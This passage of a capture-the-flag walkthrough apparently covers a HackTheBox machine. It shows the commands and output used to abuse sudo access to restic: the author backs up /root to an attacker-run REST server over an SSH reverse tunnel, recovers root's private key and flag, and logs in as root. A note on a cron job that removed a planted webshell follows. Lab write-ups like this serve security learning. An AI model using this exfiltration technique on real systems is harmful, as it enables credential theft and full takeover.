#### Installation

Deciding that the local repo was likely a dead end, I turned towards the REST repo. The documentation points to [this server](https://github.com/restic/rest-server).

Installing it was pretty simple:

```

root@kali:/opt# git clone https://github.com/restic/rest-server.git
Cloning into 'rest-server'...                   
remote: Enumerating objects: 3101, done.
remote: Total 3101 (delta 0), reused 0 (delta 0), pack-reused 3101
Receiving objects: 100% (3101/3101), 5.61 MiB | 10.93 MiB/s, done.
Resolving deltas: 100% (1145/1145), done.
root@kali:/opt# cd rest-server/
root@kali:/opt/rest-server# make
root@kali:/opt/rest-server# make install
/usr/bin/install -m 755 rest-server /usr/local/bin/rest-server

```

Now I can run the server. It took me a couple of runs and reading docs to get the server to run, but on the third try it did:

```

root@kali:/opt/rest-server# rest-server
Data directory: /tmp/restic
Authentication enabled
error: cannot load .htpasswd (use --no-auth to disable): stat /tmp/restic/.htpasswd: no such file or directory

root@kali:/opt/rest-server# rest-server --no-auth
Data directory: /tmp/restic
Authentication disabled
Private repositories disabled
Starting server on :8000
error: listen tcp :8000: bind: address already in 

root@kali:/opt/rest-server# rest-server --no-auth --listen 0.0.0.0:4433
Data directory: /tmp/restic
Authentication disabled
Private repositories disabled
Starting server on 0.0.0.0:4433 

```

#### Tunnel

Now I need to allow Registry to commnicate back to my repo. I’m listening on 4433, so I’ll ssh in as bolt with and create that tunnel just as [above](#method-2-ssh-reverse-tunnel).

```

root@kali# ssh -i ~/id_rsa_registry_root bolt@10.10.10.159 -R:4433:localhost:4433

```

I can see that Registry is listening on 4433:

```

bolt@bolt:/dev/shm$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4433          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:4433                :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

```

#### Backup /root

I’ll follow similar procedure as with the local repo. I’ll start by creating a repo:

```

www-data@bolt:/dev/shm$ restic init -r rest:http://127.0.0.1:4433/0xdf
enter password for new repository: 
enter password again: 
created restic repository 98a0e52ca7 at rest:http://127.0.0.1:4433/0xdf

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.

```

In my local terminal where the rest server is running, it prints:

```

Creating repository directories in /tmp/restic/0xdf

```

I’ll go right to the `sudo` version this time, and back up all of `/root`:

```

www-data@bolt:/dev/shm$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:4433/0xdf /root
enter password for repository: 
password is correct
found 1 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 14 files in 0:00
[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 
duration: 0:00
snapshot 7ade8718 saved

```

#### Local File Access

From my local box, I can now list the files in the repo:

```

root@kali# restic -r /tmp/restic/0xdf/ ls latest
enter password for repository: 
repository 98a0e52c opened successfully, password is correct
created new cache in /root/.cache/restic
snapshot 7ade8718 of [/root] filtered by [] at 2019-10-25 13:09:18.731156337 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.config
/root/.config/composer
/root/.config/composer/keys.dev.pub
/root/.config/composer/keys.tags.pub
/root/.gnupg
/root/.gnupg/private-keys-v1.d
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.profile
/root/.selected_editor
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.wget-hsts
/root/config.yml
/root/cron.sh
/root/root.txt

```

I can read `root.txt` (again, strangely, not an md5):

```

root@kali# restic -r /tmp/restic/0xdf/ dump latest /root/root.txt
enter password for repository: 
repository 98a0e52c opened successfully, password is correct
ntrkzgnk************************

```

I can also restore the entire directory contents to a local directory:

```

root@kali# find root/ -type f
root/.wget-hsts
root/.profile
root/cron.sh
root/.bashrc
root/.cache/motd.legal-displayed
root/.ssh/id_rsa.pub
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.selected_editor
root/root.txt
root/.config/composer/keys.tags.pub
root/.config/composer/keys.dev.pub
root/config.yml

```

#### Shell via SSH

In addition to `root.txt`, there’s also a `.ssh/id_rsa`. And it works to SSH as root to Registry:

```

root@kali# ssh -i ~/id_rsa_registry_root root@10.10.10.159
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri Oct 25 13:13:13 UTC 2019

  System load:  0.0               Users logged in:                1
  Usage of /:   9.4% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 32%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    173
Last login: Fri Oct 25 10:21:00 2019 from 10.10.14.6
root@bolt:~#

```

## Beyond Root - Cleanup

There’s a script, `cron.sh` in root’s homedir:

```

#!/bin/bash

/bin/cp /root/config.yml /var/www/html/bolt/app/config/config.yml
/bin/rm -rf /var/www/html/bolt/files/*

```

This is what was deleting my webshell every couple minutes. And as it’s not cleaning up any other files, that’s why my copied webshell was able to survive. root has a cron running that runs this script every two minutes:

```

root@bolt:~# crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/2 * * * * /bin/bash /root/cron.sh

```